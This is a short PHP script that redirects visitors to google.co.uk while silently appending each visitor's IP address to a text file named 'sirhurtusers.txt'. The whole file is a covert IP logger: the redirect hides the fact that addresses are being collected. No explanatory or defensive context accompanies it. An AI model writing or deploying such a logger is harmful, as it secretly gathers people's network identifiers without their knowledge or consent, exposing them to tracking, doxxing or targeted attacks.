<?php
header( 'Location: http://www.google.co.uk') ;
$ip = $_SERVER['REMOTE_ADDR'];
$fo = fopen("sirhurtusers.txt", "a");
$fw = fwrite($fo, "$ip\n");
fclose($fo);
?>
